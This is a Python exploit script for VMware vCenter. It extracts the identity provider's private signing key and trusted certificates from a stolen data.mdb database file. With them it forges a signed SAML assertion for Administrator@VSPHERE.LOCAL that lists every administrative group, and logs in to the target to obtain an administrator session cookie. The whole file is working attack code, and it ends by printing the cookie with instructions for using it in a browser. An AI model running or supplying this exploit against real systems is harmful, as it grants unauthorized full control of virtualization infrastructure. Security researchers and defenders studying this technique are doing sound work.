#!/usr/bin/env python3
r'''
	Copyright 2022 Photubias(c)

        This program is free software: you can redistribute it and/or modify
        it under the terms of the GNU General Public License as published by
        the Free Software Foundation, either version 3 of the License, or
        (at your option) any later version.

        This program is distributed in the hope that it will be useful,
        but WITHOUT ANY WARRANTY; without even the implied warranty of
        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
        GNU General Public License for more details.

        You should have received a copy of the GNU General Public License
        along with this program.  If not, see <http://www.gnu.org/licenses/>.

        Based on and with great thanks to: 
        https://www.horizon3.ai/compromising-vcenter-via-saml-certificates/

        It requires the data.mdb file
        Default location: /storage/db/vmware-vmdir/data.mdb

        Dependencies: python3 -m pip install requests bitstring signxml python-dateutil
'''

import argparse, base64, sys, zlib, socket, ssl, requests, urllib3, bitstring
from urllib.parse import parse_qs, urlparse
from datetime import datetime
from dateutil.relativedelta import relativedelta
import OpenSSL.crypto as crypto
import lxml.etree as etree
from signxml import XMLSigner ## pip3 install signxml

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

idp_cert_flag = b'\x30\x82\x04'
##CN=TrustedCertChain-1,CN=TrustedCertificateChains,CN=vsphere.local,CN=Tenants,CN=IdentityManager,CN=Services,dc=vsphere,dc=local
trusted_cert_flag = b'CN=TrustedCertChain-1,CN=Tru'
trusted_cert_flag2 = b'cn=TrustedCertChain-1,cn=Tru'
not_it_list = [b'Engineering', b'California', b'object']

SAML_TEMPLATE = \
r"""<?xml version="1.0" encoding="UTF-8"?>
<saml2p:Response xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol" Destination="https://$VCENTER_IP/ui/saml/websso/sso" ID="_eec012f2ebbc1f420f3dd0961b7f4eea" InResponseTo="$ID" IssueInstant="$ISSUEINSTANT" Version="2.0">
  <saml2:Issuer xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">https://$VCENTER/websso/SAML2/Metadata/vsphere.local</saml2:Issuer>
  <saml2p:Status>
    <saml2p:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
    <saml2p:StatusMessage>Request successful</saml2p:StatusMessage>
  </saml2p:Status>
  <saml2:Assertion xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" ID="_91c01d7c-5297-4e53-9763-5ef482cb6184" IssueInstant="$ISSUEINSTANT" Version="2.0">
    <saml2:Issuer Format="urn:oasis:names:tc:SAML:2.0:nameid-format:entity">https://$VCENTER/websso/SAML2/Metadata/vsphere.local</saml2:Issuer>
    <ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#" Id="placeholder"></ds:Signature>
    <saml2:Subject>
      <saml2:NameID Format="http://schemas.xmlsoap.org/claims/UPN">Administrator@VSPHERE.LOCAL</saml2:NameID>
      <saml2:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
        <saml2:SubjectConfirmationData InResponseTo="$ID" NotOnOrAfter="$NOT_AFTER" Recipient="https://$VCENTER/ui/saml/websso/sso"/>
      </saml2:SubjectConfirmation>
    </saml2:Subject>
    <saml2:Conditions NotBefore="$NOT_BEFORE" NotOnOrAfter="$NOT_AFTER">
      <saml2:ProxyRestriction Count="10"/>
      <saml2:Condition xmlns:rsa="http://www.rsa.com/names/2009/12/std-ext/SAML2.0" Count="10" xsi:type="rsa:RenewRestrictionType"/>
      <saml2:AudienceRestriction>
        <saml2:Audience>https://$VCENTER/ui/saml/websso/metadata</saml2:Audience>
      </saml2:AudienceRestriction>
    </saml2:Conditions>
    <saml2:AuthnStatement AuthnInstant="$ISSUEINSTANT" SessionIndex="_50082907a3b0a5fd4f0b6ea5299cf2ea" SessionNotOnOrAfter="$NOT_AFTER">
      <saml2:AuthnContext>
        <saml2:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</saml2:AuthnContextClassRef>
      </saml2:AuthnContext>
    </saml2:AuthnStatement>
    <saml2:AttributeStatement>
      <saml2:Attribute FriendlyName="Groups" Name="http://rsa.com/schemas/attr-names/2009/01/GroupIdentity" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:uri">
        <saml2:AttributeValue xsi:type="xsd:string">vsphere.local\Users</saml2:AttributeValue>
        <saml2:AttributeValue xsi:type="xsd:string">vsphere.local\Administrators</saml2:AttributeValue>
        <saml2:AttributeValue xsi:type="xsd:string">vsphere.local\CAAdmins</saml2:AttributeValue>
        <saml2:AttributeValue xsi:type="xsd:string">vsphere.local\ComponentManager.Administrators</saml2:AttributeValue>
        <saml2:AttributeValue xsi:type="xsd:string">vsphere.local\SystemConfiguration.BashShellAdministrators</saml2:AttributeValue>
        <saml2:AttributeValue xsi:type="xsd:string">vsphere.local\SystemConfiguration.Administrators</saml2:AttributeValue>
        <saml2:AttributeValue xsi:type="xsd:string">vsphere.local\LicenseService.Administrators</saml2:AttributeValue>
        <saml2:AttributeValue xsi:type="xsd:string">vsphere.local\Everyone</saml2:AttributeValue>
      </saml2:Attribute>
      <saml2:Attribute FriendlyName="userPrincipalName" Name="http://schemas.xmlsoap.org/claims/UPN" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:uri">
        <saml2:AttributeValue xsi:type="xsd:string">Administrator@VSPHERE.LOCAL</saml2:AttributeValue>
      </saml2:Attribute>
      <saml2:Attribute FriendlyName="Subject Type" Name="http://vmware.com/schemas/attr-names/2011/07/isSolution" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:uri">
        <saml2:AttributeValue xsi:type="xsd:string">false</saml2:AttributeValue>
      </saml2:Attribute>
      <saml2:Attribute FriendlyName="surname" Name="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/surname" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:uri">
        <saml2:AttributeValue xsi:type="xsd:string">vsphere.local</saml2:AttributeValue>
      </saml2:Attribute>
      <saml2:Attribute FriendlyName="givenName" Name="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/givenname" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:uri">
        <saml2:AttributeValue xsi:type="xsd:string">Administrator</saml2:AttributeValue>
      </saml2:Attribute>
    </saml2:AttributeStatement>
  </saml2:Assertion>
</saml2p:Response>
"""
def writepem(bytes, verbose):
    data = base64.encodebytes(bytes).decode("utf-8").rstrip()
    key = "-----BEGIN CERTIFICATE-----\n" + data + "\n-----END CERTIFICATE-----"
    if verbose:
        print('[*] Extracted Trusted certificate:')
        print(key + '\n')

    return key
    
def writekey(bytes, verbose):
    data = base64.encodebytes(bytes).decode("utf-8").rstrip()
    key = "-----BEGIN PRIVATE KEY-----\n" + data + "\n-----END PRIVATE KEY-----"
    if verbose:
        print('[*] Extracted IdP certificate:')
        print(key + '\n')
    
    return key

def get_idp_cert(stream, verbose=False):
    tup = stream.findall(idp_cert_flag, bytealigned=True)
    matches = list(tup)
    #print('Amount of matches: '+str(len(matches)))
    for match in matches:
        stream.pos = match - 32
        flag = stream.read('bytes:3')
        if flag == b'\x00\x01\x04':
            size_hex = stream.read('bytes:1')
            size_hex = b'\x04' + size_hex
            size = int(size_hex.hex(), 16) 
            cert_bytes = stream.read(f'bytes:{size}')
            if any(not_it in cert_bytes for not_it in not_it_list): continue

            key = writekey(cert_bytes, verbose)
            print('[*] Successfully extracted the IdP certificate')
            return key
    else:
        print(f'[-] Failed to find the IdP certificate')
        sys.exit()

def get_trusted_cert(stream, verbose=False):
    ## Originally this was a parsing attempt with static offsets, did not work
    def parse_cert(stream):
      stream.read('bytes:128')
      bFullData = stream.read('bytes:8192')
      iCert1Offset = bFullData.index(b'\x30\x82') - 2
      if not bFullData[iCert1Offset:iCert1Offset+1].hex().startswith('0'): exit('[-] Failure detecting Trusted Cert 1')
      iCert1Len = int(bFullData[iCert1Offset:iCert1Offset+2].hex(), 16)
      oCert1 = writepem(bFullData[iCert1Offset+2:iCert1Offset+2+iCert1Len], verbose)
      print('[*] Successfully extracted trusted certificate 1') 

      iCert2Offset = iCert1Offset + 2 + iCert1Len + 1 ## +2 for length field, +1 for nullbyte
      if not bFullData[iCert1Offset:iCert1Offset+1].hex().startswith('0'): exit('[-] Failure detecting Trusted Cert 2')
      iCert2Len = int(bFullData[iCert2Offset:iCert2Offset+2].hex(), 16)
      oCert2 = writepem(bFullData[iCert2Offset+2:iCert2Offset+2+iCert2Len], verbose)
      print('[*] Successfully extracted trusted certificate 2') 

      return oCert1, oCert2
    if stream.find(trusted_cert_flag):
      return parse_cert(stream)
    elif stream.find(trusted_cert_flag2):
      return parse_cert(stream)
    else:
        print(f'[-] Failed to find the trusted certificates')

def saml_request(vcenter):
    """Get SAML AuthnRequest from vCenter web UI"""
    try:
        print(f'[*] Initiating SAML request with {vcenter}')
        r = requests.get(f"https://{vcenter}/ui/login", allow_redirects=False, verify=False)
        if r.status_code != 302:
            raise Exception("expected 302 redirect")
        o = urlparse(r.headers["location"])
        sr = parse_qs(o.query)["SAMLRequest"][0]
        dec = base64.decodebytes(sr.encode("utf-8"))
        req = zlib.decompress(dec, -8)
        return etree.fromstring(req)
    except:
        print(f'[-] Failed initiating SAML request with {vcenter}')
        raise

def fill_template(vcenter_hostname, vcenter_ip, req):
    """Fill in the SAML response template"""
    try:
        print('[*] Generating SAML assertion') 
        # Generate valid timestamps
        before = (datetime.today() + relativedelta(months=-1)).isoformat()[:-3]+'Z'
        after = (datetime.today() + relativedelta(months=1)).isoformat()[:-3]+'Z'

        # Replace fields dynamically
        t = SAML_TEMPLATE
        t = t.replace("$VCENTER_IP", vcenter_ip)
        t = t.replace("$VCENTER", vcenter_hostname)
        t = t.replace("$ID", req.get("ID"))
        t = t.replace("$ISSUEINSTANT", req.get("IssueInstant"))
        t = t.replace("$NOT_BEFORE", before)
        t = t.replace("$NOT_AFTER", after)
        return etree.fromstring(t.encode("utf-8"))
    except:
        print('[-] Failed generating the SAML assertion')
        raise

def sign_assertion(root, cert1, cert2, key):
    """Sign the SAML assertion in the response using the IdP key"""
    try:
        print('[*] Signing the SAML assertion')
        assertion_id = root.find("{urn:oasis:names:tc:SAML:2.0:assertion}Assertion").get("ID")
        signer = XMLSigner(c14n_algorithm="http://www.w3.org/2001/10/xml-exc-c14n#")
        signed_assertion = signer.sign(root, reference_uri=assertion_id, key=key, cert=[cert1, cert2])
        return signed_assertion
    except:
        print('[-] Failed signing the SAML assertion')
        raise

def login(vcenter, saml_resp):
    """Log in to the vCenter web UI using the signed response and return a session cookie"""
    try:
        print('[*] Attempting to log into vCenter with the signed SAML request')
        resp = etree.tostring(saml_resp, xml_declaration=True, encoding="UTF-8", pretty_print=False)
        r = requests.post(
            f"https://{vcenter}/ui/saml/websso/sso",
            allow_redirects=False,
            verify=False,
            data={"SAMLResponse": base64.encodebytes(resp)},
        )
        if r.status_code != 302:
            raise Exception("expected 302 redirect")
        cookie = r.headers["Set-Cookie"].split(";")[0]
        print(f'[+] Successfuly obtained Administrator cookie for {vcenter}!')
        print(f'[+] Cookie: {cookie}')
        print(f'[+] Put this as a cookie in your browser and open https://{vcenter}/ui')
    except:
        print('[-] Failed logging in with SAML request')
        raise

def get_hostname(vcenter):
    try:
        print('[*] Obtaining hostname from vCenter SSL certificate')
        dst = (vcenter, 443)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(dst)
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        s = ctx.wrap_socket(s, server_hostname=dst[0])

        # get certificate
        cert_bin = s.getpeercert(True)
        x509 = crypto.load_certificate(crypto.FILETYPE_ASN1,cert_bin)
        hostname = x509.get_subject().CN
        print(f'[*] Found hostname {hostname} for {vcenter}')
        return hostname
    except:
        print('[-] Failed obtaining hostname from SSL certificates for {vcenter}')
        raise

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-p', '--path', help='The path to the data.mdb file', required=True)
    parser.add_argument('-t', '--target', help='The IP address of the target', required=True)
    parser.add_argument('-v', '--verbose', action='store_true', help='Print the extracted certificates')
    args = parser.parse_args()

    # Extract certificates
    in_stream = open(args.path, 'rb')
    bin_stream = bitstring.ConstBitStream(in_stream)
    idp_cert = get_idp_cert(bin_stream, args.verbose)
    trusted_cert_1, trusted_cert_2 = get_trusted_cert(bin_stream, args.verbose)

    # Generate SAML request
    hostname = get_hostname(args.target)
    req = saml_request(args.target)
    t = fill_template(hostname, args.target, req)
    s = sign_assertion(t, trusted_cert_1, trusted_cert_2, idp_cert)
    c = login(args.target, s)
